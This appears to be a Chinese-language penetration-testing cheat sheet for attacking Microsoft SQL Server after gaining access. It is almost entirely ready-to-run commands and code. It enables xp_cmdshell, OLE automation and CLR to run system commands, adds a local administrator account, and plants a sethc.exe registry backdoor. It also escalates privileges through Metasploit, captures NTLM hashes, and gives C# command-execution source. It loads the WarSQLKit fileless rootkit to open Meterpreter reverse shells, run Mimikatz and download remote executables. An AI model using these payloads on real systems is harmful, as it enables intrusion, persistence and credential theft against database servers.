  #### 开启xp_cmdshell
  	查询状态
  	>select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell' 存在返回1
	EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
	exec sp_configure 'xp_cmdshell',1;reconfigure;
	exec master.dbo.xp_cmdshell 'ipconfig'
	exec master..xp_cmdshell 'whoami'
  ##### xp_regwrite
	xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\taskmgr.exe'
  ##### xp_dirtree
	execute master..xp_dirtree 'c:' //列出所有c:\文件和目录,子目录 
	execute master..xp_dirtree 'c:',1 //只列c:\文件夹 
	execute master..xp_dirtree 'c:',1,1 //列c:\文件夹加文件 
  ##### sp_oacreate
  	查询状态
	select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE' 存在返回1
	exec sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE;
	exec sp_configure 'Ola Automation Procedures' , 1;RECONFIGURE WITH OVERRIDE;
	执行命令无回显
	declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user 123 123 /add>c:\\1.txt'
	declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators 123/add'
	删除文件
	declare @result int
	declare @fso_token int
	exec sp_oacreate 'scripting.filesystemobject', @fso_token out
	exec sp_oamethod @fso_token,'deletefile',null,'c:\1.txt'
	exec sp_oadestroy @fso_token
	复制文件
	declare @o int
	exec sp_oacreate 'scripting.filesystemobject',@o out
	exec sp_oamethod @o,'copyfile',null,'c:\1.txt','c:\2.txt'
	移动文件
	declare @o int
	exec sp_oacreate 'scripting.filesystemobject',@o out
	exec sp_oamethod @o,'movefile',null,'c:\1.txt','c:\2.txt'
  ##### 沙盒执行
	开启沙盒：
	>exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
	执行：
	>select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell("whoami")')
  ##### PowerupSQL
  	>Get-SQLServerLinkCrawl -Username sa -Password Password@ 1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;')"
  #### 滥用trustworthy权限提升
  	查询当前用户trustworthy状态，trustworthy的值为 1，表示已激活。
	>select name,is_trustworthy_on from sys.databases
	也可使用PowerupSQL查询
	>Import-Module .\PowerUpSQL.ps1
	>Invoke-SQLAuditPrivTrustworthy -Username name -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Verbose
	提权
	>Import-Module .\Invoke-SqlServer-Escalate-Dbowner.psm1
	>Invoke-SqlServer-Escalate-DbOwner -SqlUser name -SqlPass Password@1 -SqlServerInstance WIN-P83OS778EQK\SQLEXPRESS
	或使用msf来提权
	>use auxiliary/admin/mssql_escalate_dbowner
	>set rhosts 192.168.1.146
	>set username name
	>set password Password@1
	>exploit
	提权成功后获取会话
	>use exploit/windows/mssql/mssql_payload
	>set rhosts 192.168.1.146
	>set username name
	>set password Password@1
	>exploit
  #### 启用外部脚本执行命令
	查看服务器是否启用
	sp_configure 'external scripts enabled'
	GO
  	当maximum，config_value，run_value为1时则确认启动
	执行python
	>EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("ipconfig"))'
	执行R Script
	>EXEC sp_execute_external_script
	>@language=N'R',
	>@script=N'OutputDataSet <- data.frame(system("cmd.exe /c ipconfig",intern=T))'
	>WITH RESULT SETS (([cmd_out] text));
	>GO
  #### CLR
  	VS创建sql server数据库项目，选择目标平台和创建脚本.sql文件，修改目标框架和权限级别unsafe
	创建SQL CLR C#存储过程，写入代码
```csharp
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Text;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void ExecCommand (string cmd)
    {
        // 在此处放置代码
        SqlContext.Pipe.Send("Command is running, please wait.");
        SqlContext.Pipe.Send(RunCommand("cmd.exe", " /c " + cmd));
    }
    public static string RunCommand(string filename,string arguments)
    {
        var process = new Process();

        process.StartInfo.FileName = filename;
        if (!string.IsNullOrEmpty(arguments))
        {
            process.StartInfo.Arguments = arguments;
        }

        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;

        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        var stdOutput = new StringBuilder();
        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
        string stdError = null;
        try
        {
            process.Start();
            process.BeginOutputReadLine();
            stdError = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send(e.Message);
        }

        if (process.ExitCode == 0)
        {
            SqlContext.Pipe.Send(stdOutput.ToString());
        }
        else
        {
            var message = new StringBuilder();

            if (!string.IsNullOrEmpty(stdError))
            {
                message.AppendLine(stdError);
            }

            if (stdOutput.Length != 0)
            {
                message.AppendLine("Std output:");
                message.AppendLine(stdOutput.ToString());
            }
            SqlContext.Pipe.Send(filename + arguments + " finished with exit code = " + process.ExitCode + ": " + message);
        }
        return stdOutput.ToString();
    }
}
```
	启用MSSQL CLR
	sp_configure 'clr enabled', 1
	GO
	RECONFIGURE
	GO
	ALTER DATABASE master SET TRUSTWORTHY ON;
	获取字节流
	var byteStream =BitConverter.ToString(File.ReadAl1Bytes(@"c:\your.dll")).Replace("-",""); 
	File.WriteAllText(@"C:\bytestream.txt",byteStream);
	利用SQL语句导入程序集
	CREATE ASSEMBLY [Database1]
	    AUTHORIZATION [dbo]
	FROM 0x4d5a...[...]
	WITH PERMISSION_SET = UNSAFE;
	GO
	创建存储过程
	CREATE PROCEDURE [dbo].[ExecCommand]
	@cmd NVARCHAR (MAX)
	AS EXTERNAL NAME [Database1].[StoredProcedures].[ExecCommand]
	go
	无文件落地执行命令
	exec dbo.ExecCommand "whoami";
  #### R脚本
  	前提条件：
	Machine Learning Services必须要在Python安装过程中选择
	必须启用外部脚本
	EXEC sp_configure 'external scripts enabled', 1
	RECONFIGURE WITH OVERRIDE
	重新启动数据库服务器
	用户拥有执行任何外部脚本权限
	MSSQL 2017加入了Microsoft机器学习服务，该服务允许通过MSSQL中sp_execute_external_script执行Python和R脚本
	R脚本执行命令
	sp_configure 'external scripts enabled'
	GO
	EXEC sp_execute_external_script
	@language=N'R',
	@script=N'OutputDataSet <- data.frame(system("cmd.exe
	/c dir",intern=T))'
	WITH RESULT SETS (([cmd_out] text));
	GO
	抓取Net-NTLM哈希
	@script=N'.libPaths("\\\\testhost\\foo\\bar");library("0mgh4x")'
  #### python脚本
  	exec sp_execute_external_script 
	@language =N'Python',
	@script=N'import sys
	OutputDataSet = pandas.DataFrame([sys.version])'
	WITH RESULT SETS ((python_version nvarchar(max)))
	执行命令
	exec sp_execute_external_script 
	@language =N'Python',
	@script=N'import subprocess
	p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE)
	OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'
	WITH RESULT SETS (([cmd_out] nvarchar(max)))
  #### WarSQLKit
	WarSQLKit.dll: https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit/raw/master/WarSQLKit/bin/Debug/WarSQLKit.dll
	WarSQLKit_Compressed.dll: https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit/raw/master/WarSQLKit/bin/Debug/Confused/WarSQLKit.dll
	WarSQLKitMinimal.dll: https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit/raw/master/WarSQLKitMinimal/bin/Debug/WarSQLKitMinimal.dll
	Meterpreter CSharp (C#) Shellcode: https://github.com/EPICROUTERSS/Build-Meterpreter-CSharp-Shellcode
	Meterpreter CSharp（C#）Base64编码的Shellcode：https://github.com/EPICROUTERSS/Build-Encoded-Meterpreter-C-Shellcode
	OSCMDEXEC_CLR: https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_clr.sql
	获取WarSQLKit字节流
	var byteStream =BitConverter.ToString(File.ReadAl1Bytes(@"c:\WarSQLKit.dll")).Replace("-",""); 
	File.WriteAllText(@"C:\bytestream.txt",byteStream);
	导入
	CREATE ASSEMBLY [WarSQLKit]
	    AUTHORIZATION [dbo]
	    FROM 0x4d5a...[...]
	    WITH PERMISSION_SET = UNSAFE;
	GO
	创建存储过程
	CREATE PROCEDURE sp_cmdExec
	@Command [nvarchar](4000)
	WITH EXECUTE AS CALLER
	AS
	EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec
	GO
	执行命令
	EXEC sp_cmdExec 'whoami';
	以NT AUTHORITY\SYSTEM权限执行Windows命令
	EXEC sp_cmdExec 'whoami /RunSystemPriv';
	以NT AUTHORITY\SYSTEM权限运行PowerShell命令
	EXEC sp_cmdExec 'powershell Get-ChildItem /RunSystemPS';
	生成一个以NT AUTHORITY\SYSTEM权限运行的X86 Meterpreter反向连接shell
	EXEC sp_cmdExec 'sp_meterpreter_reverse_tcp LHOST LPORT GetSystem';
	生成一个以NT AUTHORITY\SYSTEM权限运行的X64 Meterpreter反向连接shell
	EXEC sp_cmdExec 'sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem';
	生成一个以NT AUTHORITY\SYSTEM权限运行的X64 Meterpreter RC4反向连接shell
	EXEC sp_cmdExec 'sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem'
	RC4PASSWORD=warsql
	生成一个以NT AUTHORITY\SYSTEM权限运行的X86 meterpreter_bind_tcp shell
	EXEC sp_cmdExec 'sp_meterpreter_bind_tcp LPORT GetSystem';
	运行Mimikatz功能抓取密码
	EXEC sp_cmdExec 'sp_Mimikatz';
	获取Mimikatz日志
	select * from WarSQLKitTemp
	文件下载
	EXEC sp_cmdExec 'sp_downloadFile http://test.com/file.exe C:\ProgramData\file.exe 300';
	获取MSSQL Hash
	EXEC sp_cmdExec 'sp_getSqlHash';
	获取Windows版本
	EXEC sp_cmdExec 'sp_getProduct';
	获取可用的数据库
	EXEC sp_cmdExec 'sp_getDatabases';
  #### 利用sp_addextendedproc恢复组件
  	EXEC sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
	EXEC sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'
	EXEC sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'
	EXEC sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'
	EXEC sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'
	EXEC sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'
	EXEC sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'
	EXEC sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'
	EXEC sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'
	EXEC sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'
	EXEC sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'
	EXEC sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'
	EXEC sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'
	EXEC sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'
	EXEC sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'
	EXEC sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'
	EXEC sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'
	EXEC sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'
	EXEC sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'
	EXEC sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'
	EXEC sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'
  #### 